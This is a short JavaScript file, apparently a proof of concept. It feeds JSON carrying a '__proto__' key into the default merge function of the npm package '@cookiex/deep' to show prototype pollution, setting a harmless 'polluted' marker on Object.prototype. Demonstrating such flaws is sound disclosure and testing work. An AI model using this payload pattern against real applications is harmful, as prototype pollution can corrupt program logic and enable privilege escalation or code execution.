 
  const deep = require("@cookiex/deep");
   

  const target = {};
  deep.default(target, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
// End of file
